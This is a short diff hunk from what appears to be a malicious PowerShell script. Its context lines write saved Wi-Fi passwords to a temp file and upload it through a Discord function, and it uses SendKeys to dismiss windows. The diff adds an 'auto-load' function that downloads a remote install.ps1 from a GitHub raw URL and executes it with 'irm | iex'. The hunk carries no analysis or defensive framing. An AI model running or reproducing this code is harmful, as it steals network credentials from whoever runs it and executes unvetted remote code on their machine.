@@ -96,6 +96,10 @@ $wifiProfiles > $env:TEMP/--wifi-pass.txt
 Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
 }
 
+function auto-load{
+irm https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/install.ps1 | iex
+}
+
 $wshell = New-Object -ComObject wscript.shell;
 function yut {
 $wshell.SendKeys('{ESC}')
